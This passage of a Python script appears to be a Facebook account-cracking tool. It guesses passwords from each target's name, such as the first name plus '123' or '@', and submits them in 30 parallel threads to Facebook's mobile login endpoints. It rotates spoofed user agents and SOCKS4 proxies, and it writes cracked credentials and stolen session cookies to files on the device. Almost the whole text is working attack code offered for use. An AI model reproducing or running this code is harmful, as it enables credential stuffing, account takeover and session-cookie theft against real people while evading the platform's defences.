	apx=input(f"  [{S}+{E}] Choice : ")
	if apx in ['y','Y','Yes','YES','1',"yes","yy"]:
		apkx.append(f'y')
	else:
		apkx.append(f'n')
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	if mh in ["1", "01","11","A","a"]:
		passwrd1();exit()
	if mh in ["2", "02","22","B","b"]:
		passwrd2();exit()
	elif mh in ["3", "03","33","C","c"]:
		passwrd3()
	elif mh in ["4", "04","44","D","d"]:
		passwrd4()
	else:
		print(f'\n \t {R}Choose valid option{E}');time.sleep(1);setting()
######
def passwrd1():
	logo();print(f"  [{G}A{E}] METHOD 1 {R}[{W}MIX{R}]{E}\n  [{G}B{E}] METHOD 2 {R}[{W}MIX{R}]{E}\n  [{G}C{E}] METHOD 3 {R}[{W}MIX{R}]{E}\n  [{G}D{E}] METHOD 4 {R}[{W}NEW{R}]{E}");line()
	meth=input (f"  {W}[{S}+{W}]{W} Choice: {G}")
	logo()
	tid=str(len(id))
	print(f'  TOTAL ID : \033[1;32m'+tid+f' \n\033[1;37m  THE PROCESS HAS BEEN STARTED  \n  USE AEROPLANE MOOD IN EVERY 5 MIN \n{40*"="}  ')
	with tred(max_workers=30) as tooox:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(nmf)
					pwv.append(frs+'12345')
					pwv.append('i love you')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(nmf)
					pwv.append('i love you')
					pwv.append(frs+'12345')
				if meth in ["1", "01","11","A","a"]:
					tooox.submit(method1,idf,pwv)
				elif meth in ["2", "02","22","B","b"]:
					tooox.submit(method2,idf,pwv)
				elif meth in ["3", "03","33","C","c"]:
					tooox.submit(method3,idf,pwv)
				elif meth in ["4", "04","44","D","d"]:
					tooox.submit(method4,idf,pwv)
	print(" ")
	line()
	print(f"  {W}The Process Has Been Completed{E}");input(f"  {W}Press enter to back{E}")
	os.system("python THECHEL.py")
###
def passwrd2():
	logo();print(f"  [{G}A{E}] METHOD 1 {R}[{W}MIX{R}]{E}\n  [{G}B{E}] METHOD 2 {R}[{W}MIX{R}]{E}\n  [{G}C{E}] METHOD 3 {R}[{W}MIX{R}]{E}\n  [{G}D{E}] METHOD 4 {R}[{W}NEW{R}]{E}");line()
	meth=input (f"  {W}[{S}+{W}]{W} Choice: {G}")
	logo()
	tid=str(len(id))
	print(f'  TOTAL ID : \033[1;32m'+tid+f' \n\033[1;37m  THE PROCESS HAS BEEN STARTED  \n  USE AEROPLANE MOOD IN EVERY 5 MIN \n{40*"="}  ')
	with tred(max_workers=30) as tooox:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append('i love you')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(nmf)
					pwv.append(frs+'@')
					pwv.append(frs+'@123')
					pwv.append(frs+'@@')
					pwv.append('i love you')
					pwv.append(frs+'@@@')
					pwv.append(frs+'@@@@')
					pwv.append(frs+'@#')
					pwv.append(frs+'1122')
					pwv.append(frs+'12')
				if meth in ["1", "01","11","A","a"]:
					tooox.submit(method1,idf,pwv)
				elif meth in ["2", "02","22","B","b"]:
					tooox.submit(method2,idf,pwv)
				elif meth in ["3", "03","33","C","c"]:
					tooox.submit(method3,idf,pwv)
				elif meth in ["4", "04","44","D","d"]:
					tooox.submit(method4,idf,pwv)
	print(" ")
	line()
	print(f"  {W}The Process Has Been Completed{E}");input(f"  {W}Press enter to back{E}")
	os.system("python THECHEL.py")
######
def passwrd3():
	logo();print(f"  [{G}A{E}] METHOD 1 {R}[{W}MIX{R}]{E}\n  [{G}B{E}] METHOD 2 {R}[{W}MIX{R}]{E}\n  [{G}C{E}] METHOD 3 {R}[{W}MIX{R}]{E}\n  [{G}D{E}] METHOD 4 {R}[{W}NEW{R}]{E}");line()
	meth=input (f"  {W}[{S}+{W}]{W} Choice: {G}")
	logo()
	tid=str(len(id))
	print(f'  TOTAL ID : \033[1;32m'+tid+f' \n\033[1;37m  THE PROCESS HAS BEEN STARTED  \n  USE AEROPLANE MOOD IN EVERY 5 MIN \n{40*"="}  ')
	with tred(max_workers=30) as tooox:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12');pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12345');pwv.append(frs+'123456');pwv.append(nmf);pwv.append('57273200');pwv.append(frs+'@123');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'@@@');pwv.append(frs+'@@@@');pwv.append(frs+'@#');pwv.append(frs+'1122');pwv.append(frs+'11');pwv.append(frs+'111');pwv.append(frs+'##');pwv.append(frs+'222');pwv.append(frs+'###');pwv.append(frs+'#');pwv.append(frs+'@1234');pwv.append(frs+'@12345');pwv.append('57575751');pwv.append('57273200')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'12');pwv.append(frs+'123');pwv.append(frs+'1234');pwv.append(frs+'12345');pwv.append(frs+'123456');pwv.append(nmf);pwv.append('57273200');pwv.append(frs+'@123');pwv.append(frs+'@');pwv.append(frs+'@@');pwv.append(frs+'@@@');pwv.append(frs+'@@@@');pwv.append(frs+'@#');pwv.append(frs+'1122');pwv.append(frs+'11');pwv.append(frs+'111');pwv.append(frs+'##');pwv.append(frs+'222');pwv.append(frs+'###');pwv.append(frs+'#');pwv.append(frs+'@1234');pwv.append(frs+'@12345');pwv.append('57575751');pwv.append('57273200')
				if meth in ["1", "01","11","A","a"]:
					tooox.submit(method1,idf,pwv)
				elif meth in ["2", "02","22","B","b"]:
					tooox.submit(method2,idf,pwv)
				elif meth in ["3", "03","33","C","c"]:
					tooox.submit(method3,idf,pwv)
				elif meth in ["4", "04","44","D","d"]:
					tooox.submit(method4,idf,pwv)
	print(" ")
	line()
	print(f"  {W}The Process Has Been Completed{E}");input(f"  {W}Press enter to back{E}")
	os.system("python KHALID_V2.py")
####
KHALIDchid = []
def passwrd4():
	logo();print(f"  [{G}A{E}] METHOD 1 {R}[{W}MIX{R}]{E}\n  [{G}B{E}] METHOD 2 {R}[{W}MIX{R}]{E}\n  [{G}C{E}] METHOD 3 {R}[{W}MIX{R}]{E}\n  [{G}D{E}] METHOD 4 {R}[{W}NEW{R}]{E}");line()
	meth=input (f"  {W}[{S}+{W}]{W} Choice: {G}")
	logo()
	print('\t\t4 BEST');print (40*"=")
	passx = int(input(f"  [{S}+{W}] Enter Password Limit : "))
	logo()
	print(f"  {W}EXAMPLE{BG}: {G}708090{W},{G}57273200{W},{G}304050{W},{G}203040{W}")
	for KHALIDx in range(passx):
		line();pwwx = input(f"  [{S}{KHALIDx+1}{W}] Enter Password : ")
	logo()
	tid=str(len(id))
	print(f'  TOTAL ID : \033[1;32m'+tid+f' \n\033[1;37m  THE PROCESS HAS BEEN STARTED  \n  USE AEROPLANE MOOD IN EVERY 5 MIN \n{40*"="}  ')
	with tred(max_workers=30) as tooox:
		for yuzong in id2:
			KHALIDchid.append(pwwx)
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(nmf)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(frs+'123')
					pwv.append(nmf)
					for KHALIDxb in (KHALIDchid):
						pwv.append(KHALIDxb)
					if meth in ["1", "01","11","A","a"]:
						tooox.submit(method1,idf,pwv)
					elif meth in ["2", "02","22","B","b"]:
						tooox.submit(method2,idf,pwv)
					elif meth in ["3", "03","33","C","c"]:
						tooox.submit(method3,idf,pwv)
					elif meth in ["4", "04","44","D","d"]:
						tooox.submit(method4,idf,pwv)
	print(" ")
	line()
	print(f"  {W}The Process Has Been Completed{E}");input(f"  {W}Press enter to back{E}")
	os.system("python THECHEL.py")
#####

###########-----[ METHOD 1 ]-----#############
def method1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r  {BG}[{W}ARZEN-M1{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"m.facebook.com",
"upgrade-insecure-requests":"1",
"user-agent":ua,
"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"dnt":"1",
"x-requested-with":"mark.via.gp",
"sec-fetch-site":"none",
"sec-fetch-mode":"navigate",
"sec-fetch-user":"?1",
"sec-fetch-dest":"document",
"referer":"https://m.facebook.com/",
"accept-encoding":"gzip, deflate br",
"accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"})
			p = ses.get(f'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"m.facebook.com",
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'referer': 'https://m.facebook.com/?stype=lo&jlou=AfeZk7EFbNzFkE559XKXWNIbdUzwsxWOk7bnbEwVKVRjD7n1Dfv4jhkNhRslMRtCXL4DGuxHX_VN7IJH_RNesIP7AHfCoznTSV6wkP9c9Q_d_A&smuh=46694&lh=Ac_nyMaaWKPiJc5nIfo&_rdr',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua}
			po = ses.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'y' in cpx:
					print(f'\r\r  {BG}[{W}ARZEN-CP{BG}]{E} {B}{idf} {W}|{E} {B}{pw}{W}')
					open('/sdcard/ARZEN-FILE-CP.txt', 'a').write(idf+'|'+pw+'\n')
					akun.append(idf+' • '+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r  {BG}[{W}ARZEN-OK{BG}]{E} {G}{idf} {W}|{E} {G}{pw}{W}')
				if 'y' in cokix:
					print(f'\r  {BG}[{W}COOKIES{BG}]{E} : {G}{kuki}{E}')
				if 'y' in apkx:
					cek_apk(session,kuki)
				open('/sdcard/ARZEN-FILE-OK.txt', 'a').write(idf+'|'+pw+" |--------- "+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###########-----[ METHOD 2 ]-----#############
def method2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r  {BG}[{W}ARZEN-M2{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"p.facebook.com",
"upgrade-insecure-requests":"1",
"user-agent":ua,
"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"dnt":"1",
"x-requested-with":"mark.via.gp",
"sec-fetch-site":"none",
"sec-fetch-mode":"navigate",
"sec-fetch-user":"?1",
"sec-fetch-dest":"document",
"referer":"https://m.facebook.com/",
"accept-encoding":"gzip, deflate br",
"accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"})
			p = ses.get(f'https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"p.facebook.com",
    'viewport-width': '980',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'dnt': '1',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua}
			po = ses.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'y' in cpx:
					print(f'\r\r  {BG}[{W}ARZEN-CP{BG}]{E} {B}{idf} {W}|{E} {B}{pw}{W}')
					open('/sdcard/ARZEN-FILE-CP.txt', 'a').write(idf+'|'+pw+'\n')
					akun.append(idf+' • '+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r  {BG}[{W}ARZEN-OK{BG}]{E} {G}{idf} {W}|{E} {G}{pw}{W}')
				if 'y' in cokix:
					print(f'\r  {BG}[{W}COOKIES{BG}]{E} : {G}{kuki}{E}')
				if 'y' in apkx:
					cek_apk(session,kuki)
				open('/sdcard/ARZEN-FILE-OK.txt', 'a').write(idf+'|'+pw+" |--------- "+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###########-----[ METHOD 3 ]-----#############
def method3(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r  {BG}[{W}ARZEN-M3{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"m.facebook.com",
"upgrade-insecure-requests":"1",
"user-agent":ua,
"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"dnt":"1",
"x-requested-with":"mark.via.gp",
"sec-fetch-site":"none",
"sec-fetch-mode":"navigate",
"sec-fetch-user":"?1",
"sec-fetch-dest":"document",
"referer":"https://m.facebook.com/",
"accept-encoding":"gzip, deflate br",
"accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"})
			p = ses.get(f'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"m.facebook.com",
"cache-control":"max-age=0",
"upgrade-insecure-requests":"1",
"origin":"https://m.facebook.com",
"content-type":"application/x-www-form-urlencoded",
"user-agent":ua,
"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"x-requested-with":"mark.via.gp"
,"sec-fetch-site":"none",
"sec-fetch-mode":"navigate",
"sec-fetch-user":"?1",
"sec-fetch-dest":"document",
"referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
"accept-encoding":"gzip, deflate br",
"accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"}
			po = ses.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'y' in cpx:
					print(f'\r\r  {BG}[{W}ARZEN-CP{BG}]{E} {B}{idf} {W}|{E} {B}{pw}{W}')
					open('/sdcard/ARZEN-FILE-CP.txt', 'a').write(idf+'|'+pw+'\n')
					akun.append(idf+' • '+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r  {BG}[{W}ARZEN-OK{BG}]{E} {G}{idf} {W}|{E} {G}{pw}{W}')
				if 'y' in cokix:
					print(f'\r  {BG}[{W}COOKIES{BG}]{E} : {G}{kuki}{E}')
				if 'y' in apkx:
					cek_apk(session,kuki)
				open('/sdcard/ARZEN-FILE-OK.txt', 'a').write(idf+'|'+pw+" |--------- "+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###########-----[ METHOD 4 ]-----#############
def method4(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r  {BG}[{W}ARZEN-M4{BG}]{W} {BG}[{G}{loop}{W}/{G}{len(id)}{BG}] {BG}[{W}Ok:-{G}{ok}{BG}]{W} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":"mbasic.facebook.com",
"upgrade-insecure-requests":"1",
"user-agent":ua,
"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
"dnt":"1",
"x-requested-with":"mark.via.gp",
"sec-fetch-site":"none",
"sec-fetch-mode":"navigate",
"sec-fetch-user":"?1",
"sec-fetch-dest":"document",
"referer":"https://m.facebook.com/",
"accept-encoding":"gzip, deflate br",
"accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"})
			p = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"mbasic.facebook.com",
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua}
			po = ses.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'y' in cpx:
					print(f'\r\r  {BG}[{W}ARZEN-CP{BG}]{E} {B}{idf} {W}|{E} {B}{pw}{W}')
					open('/sdcard/ARZEN-FILE-CP.txt', 'a').write(idf+'|'+pw+'\n')
					akun.append(idf+' • '+pw)
					cp+=1
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\r  {BG}[{W}ARZEN-OK{BG}]{E} {G}{idf} {W}|{E} {G}{pw}{W}')
				if 'y' in cokix:
					print(f'\r  {BG}[{W}COOKIES{BG}]{E} : {G}{kuki}{E}')
				if 'y' in apkx:
					cek_apk(session,kuki)
				open('/sdcard/ARZEN-FILE-OK.txt', 'a').write(idf+'|'+pw+" |--------- "+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('touch prox.txt')
	except:pass
Main()
